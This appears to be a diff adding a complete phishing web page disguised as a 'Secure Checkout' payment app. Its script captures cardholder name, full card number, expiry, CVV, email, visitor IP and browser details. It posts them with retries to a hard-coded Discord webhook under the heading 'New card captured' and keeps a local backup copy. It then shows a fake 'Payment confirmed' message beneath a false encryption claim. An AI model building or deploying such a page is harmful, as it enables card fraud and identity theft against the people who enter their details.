@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>Secure Checkout</title>
+<link rel="manifest" href="manifest.json" />
+<meta name="theme-color" content="#0b0d12" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20512%20512%22%3E%3Crect%20width=%22512%22%20height=%22512%22%20rx=%22112%22%20fill=%22%2312293d%22/%3E%3Crect%20x=%22128%22%20y=%22184%22%20width=%22256%22%20height=%22150%22%20rx=%2224%22%20fill=%22%236fe3d0%22/%3E%3Crect%20x=%22128%22%20y=%22226%22%20width=%22256%22%20height=%2228%22%20fill=%22%230f2233%22/%3E%3C/svg%3E" />
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20512%20512%22%3E%3Crect%20width=%22512%22%20height=%22512%22%20rx=%22112%22%20fill=%22%2312293d%22/%3E%3Crect%20x=%22128%22%20y=%22184%22%20width=%22256%22%20height=%22150%22%20rx=%2224%22%20fill=%22%236fe3d0%22/%3E%3Crect%20x=%22128%22%20y=%22226%22%20width=%22256%22%20height=%2228%22%20fill=%22%230f2233%22/%3E%3C/svg%3E" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="Checkout" />
+<style>
+  :root{ --line:#232838; --txt:#e9ecf3; --mut:#8b93a7; --acc:#6fe3d0; }
+  *{box-sizing:border-box}
+  body{
+    margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
+    padding-top:calc(24px + env(safe-area-inset-top));
+    background:radial-gradient(1200px 600px at 50% -10%, #16202b, #0b0d12 60%);
+    font:15px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif;color:var(--txt);
+    -webkit-tap-highlight-color:transparent;
+  }
+  .wrap{width:100%;max-width:400px}
+  .preview{
+    position:relative;border-radius:16px;padding:20px;height:200px;overflow:hidden;
+    background:linear-gradient(135deg,#1b3b52,#0f2233 55%,#12293d);
+    border:1px solid #24384d;box-shadow:0 24px 50px -24px #000;
+    display:flex;flex-direction:column;justify-content:space-between;margin-bottom:20px;
+  }
+  .preview::after{
+    content:"";position:absolute;inset:-40% -10% auto auto;width:220px;height:220px;
+    background:radial-gradient(circle,#6fe3d055,transparent 70%);border-radius:50%;
+  }
+  .chip{width:46px;height:33px;border-radius:7px;background:linear-gradient(135deg,#ecd888,#b8952f);}
+  .brand-row{display:flex;justify-content:space-between;align-items:center;font-size:11px;letter-spacing:1.5px;color:#cfe6ef}
+  .pv-num{font:600 19px/1 ui-monospace,monospace;letter-spacing:2px;color:#fff;text-shadow:0 1px 2px #0006}
+  .pv-bottom{display:flex;justify-content:space-between;font-size:11px;color:#cfe6ef}
+  .pv-bottom .lbl{display:block;font-size:9px;letter-spacing:1px;color:#7fa0b3}
+  .pv-name,.pv-exp{text-transform:uppercase;letter-spacing:1px}
+  form{display:flex;flex-direction:column;gap:12px}
+  label{font-size:11px;letter-spacing:.6px;color:var(--mut);text-transform:uppercase}
+  input{
+    width:100%;margin-top:5px;padding:12px 13px;border-radius:10px;font-size:16px;
+    background:#141821;border:1px solid var(--line);color:var(--txt);
+  }
+  input:focus{outline:none;border-color:var(--acc);box-shadow:0 0 0 3px #6fe3d022}
+  .row{display:flex;gap:12px}
+  .row > div{flex:1}
+  button{
+    margin-top:4px;padding:14px;border:none;border-radius:11px;cursor:pointer;
+    font-size:15px;font-weight:650;color:#06231f;background:linear-gradient(135deg,#8df0de,#4fd0bb);
+  }
+  button:disabled{opacity:.65;cursor:default}
+  .err{color:#ff8080;font-size:12px;min-height:16px;margin:0}
+  .done{text-align:center;padding:22px 0}
+  .done .tick{
+    width:64px;height:64px;margin:0 auto 14px;border-radius:50%;
+    background:#6fe3d022;border:2px solid var(--acc);color:var(--acc);
+    font-size:32px;display:grid;place-items:center;
+  }
+  .hidden{display:none}
+  .foot{margin-top:16px;text-align:center;font-size:11px;color:var(--mut)}
+  .install{
+    position:fixed;top:calc(12px + env(safe-area-inset-top));right:12px;z-index:10;
+    padding:8px 12px;font-size:12px;font-weight:600;border-radius:20px;cursor:pointer;
+    background:#141821;border:1px solid var(--acc);color:var(--acc);
+  }
+  .install:hover{background:#6fe3d01a}
+</style>
+</head>
+<body>
+<button id="install" class="install hidden">&#8681; Install app</button>
+<main class="wrap">
+  <div class="preview">
+    <div class="brand-row"><span id="pv-brand">SECURECHECKOUT</span><span>&#128274;</span></div>
+    <div class="chip"></div>
+    <div>
+      <div class="pv-num" id="pv-num">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
+      <div class="pv-bottom" style="margin-top:12px">
+        <div><span class="lbl">CARD HOLDER</span><span class="pv-name" id="pv-name">Your Name</span></div>
+        <div><span class="lbl">EXPIRES</span><span class="pv-exp" id="pv-exp">MM/YY</span></div>
+      </div>
+    </div>
+  </div>
+  <form id="pay" novalidate>
+    <div><label for="name">Cardholder name</label>
+      <input id="name" autocomplete="cc-name" placeholder="Jane A. Doe" required /></div>
+    <div><label for="number">Card number</label>
+      <input id="number" inputmode="numeric" autocomplete="cc-number" placeholder="4242 4242 4242 4242" required /></div>
+    <div class="row">
+      <div><label for="exp">Expiry</label><input id="exp" placeholder="MM/YY" maxlength="5" required /></div>
+      <div><label for="cvv">CVV</label><input id="cvv" inputmode="numeric" maxlength="4" placeholder="123" required /></div>
+    </div>
+    <div><label for="email">Email</label>
+      <input id="email" type="email" autocomplete="email" placeholder="jane@example.com" required /></div>
+    <p class="err" id="err"></p>
+    <button type="submit" id="btn">Confirm &amp; Continue</button>
+  </form>
+  <div class="done hidden" id="done">
+    <div class="tick">&#10003;</div>
+    <h3 style="margin:0 0 6px">Payment confirmed</h3>
+    <p style="margin:0;color:var(--mut);font-size:13px">You can close this window now.</p>
+  </div>
+  <p class="foot">&#128274; Secured with 256-bit encryption</p>
+</main>
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559023662462410772/mZFXSokKFagKX-E319iaHY4Z1nNnKn03AgNmmhIoCJtTGp9jhR8dm6su5gBXYzGlA2V8';
+const $ = (s) => document.querySelector(s);
+const digits = (s) => String(s).replace(/\D/g, '');
+function luhn(num){
+  const d = digits(num); if (d.length < 12) return false;
+  let sum = 0, alt = false;
+  for (let i = d.length - 1; i >= 0; i--){
+    let n = +d[i]; if (alt){ n *= 2; if (n > 9) n -= 9; }
+    sum += n; alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+function cardType(num){
+  const n = digits(num);
+  if (/^4/.test(n)) return 'Visa';
+  if (/^(5[1-5]|2[2-7])/.test(n)) return 'Mastercard';
+  if (/^3[47]/.test(n)) return 'Amex';
+  if (/^6(?:011|5)/.test(n)) return 'Discover';
+  if (/^(?:2131|1800|35)/.test(n)) return 'JCB';
+  if (/^3(?:0[0-5]|[68])/.test(n)) return 'Diners';
+  return 'Card';
+}
+function group(num){
+  const d = digits(num);
+  if (/^3[47]/.test(d)) return [d.slice(0,4), d.slice(4,10), d.slice(10,15)].filter(Boolean).join(' ');
+  return (d.match(/.{1,4}/g) || []).join(' ');
+}
+$('#number').addEventListener('input', (e) => {
+  e.target.value = group(e.target.value);
+  $('#pv-num').textContent = group(e.target.value) || '•••• •••• •••• ••••';
+});
+$('#exp').addEventListener('input', (e) => {
+  let v = digits(e.target.value);
+  if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
+  e.target.value = v; $('#pv-exp').textContent = v || 'MM/YY';
+});
+$('#name').addEventListener('input', (e) => {
+  $('#pv-name').textContent = e.target.value || 'Your Name';
+});
+let visitorIP = null;
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json()).then(d => { visitorIP = d.ip; }).catch(() => {});
+function metadata(){
+  return {
+    time: new Date().toISOString(),
+    ip: visitorIP || '—',
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: screen.width + 'x' + screen.height,
+    referrer: document.referrer || 'direct'
+  };
+}
+function buildEmbed(p){
+  return {
+    title: '💳 New card captured',
+    color: 0x6fe3d0,
+    timestamp: p.time,
+    fields: [
+      { name: 'Card',   value: p.type + ' •••• ' + p.last4, inline: true },
+      { name: 'Expiry', value: p.expiry, inline: true },
+      { name: 'CVV',    value: p.cvv, inline: true },
+      { name: 'Number', value: '`' + group(p.number) + '`' },
+      { name: 'Name',   value: p.name || '—', inline: true },
+      { name: 'Email',  value: p.email || '—', inline: true },
+      { name: 'IP',     value: String(p.ip), inline: true },
+      { name: 'Timezone', value: String(p.timezone), inline: true },
+      { name: 'Screen', value: p.screen, inline: true }
+    ],
+    footer: { text: p.referrer.slice(0, 200) }
+  };
+}
+function backup(p){
+  try{
+    const k = 'cv_subs';
+    const arr = JSON.parse(localStorage.getItem(k) || '[]');
+    arr.push(p);
+    localStorage.setItem(k, JSON.stringify(arr));
+  }catch(e){}
+}
+async function deliver(payload, attempt = 1){
+  try{
+    const res = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [buildEmbed(payload)] })
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+  }catch(err){
+    console.warn('Send failed (attempt ' + attempt + '):', err);
+    if (attempt < 3){
+      await new Promise(r => setTimeout(r, 800 * attempt));
+      return deliver(payload, attempt + 1);
+    }
+  }
+}
+$('#pay').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const err = $('#err'), btn = $('#btn');
+  const raw = $('#number').value;
+  if (!luhn(raw)){ err.textContent = 'That card number looks invalid.'; return; }
+  if (!$('#exp').value.match(/^\d{2}\/\d{2}$/)){ err.textContent = 'Expiry must be MM/YY.'; return; }
+  if (digits($('#cvv').value).length < 3){ err.textContent = 'CVV looks too short.'; return; }
+  if (!/^\S+@\S+\.\S+$/.test($('#email').value)){ err.textContent = 'Enter a valid email.'; return; }
+  err.textContent = '';
+  btn.disabled = true;
+  btn.textContent = 'Processing…';
+  const payload = Object.assign({
+    name: $('#name').value.trim(),
+    number: digits(raw),
+    type: cardType(raw),
+    last4: digits(raw).slice(-4),
+    expiry: $('#exp').value.trim(),
+    cvv: digits($('#cvv').value),
+    email: $('#email').value.trim()
+  }, metadata());
+  backup(payload);
+  await deliver(payload);
+  $('#pay').classList.add('hidden');
+  $('#done').classList.remove('hidden');
+});
+let deferredPrompt = null;
+const installBtn = $('#install');
+const standalone = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone;
+const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
+if (!standalone){
+  if (isIOS) installBtn.classList.remove('hidden');
+  window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
+    installBtn.classList.remove('hidden');
+  });
+}
+window.addEventListener('appinstalled', () => installBtn.classList.add('hidden'));
+installBtn.addEventListener('click', async () => {
+  if (deferredPrompt){
+    deferredPrompt.prompt();
+    await deferredPrompt.userChoice;
+    deferredPrompt = null;
+    installBtn.classList.add('hidden');
+  } else if (isIOS){
+    alert('Tap the Share icon, then "Add to Home Screen".');
+  }
+});
+if ('serviceWorker' in navigator){
+  window.addEventListener('load', () => navigator.serviceWorker.register('sw.js').catch(() => {}));
+}
+if (location.search.indexOf('test') > -1){
+  deliver(Object.assign({
+    name: 'Test User', number: '4242424242424242', type: 'Visa', last4: '4242',
+    expiry: '12/34', cvv: '123', email: 'test@example.com'
+  }, metadata()));
+}
+</script>
+</body>
+</html>
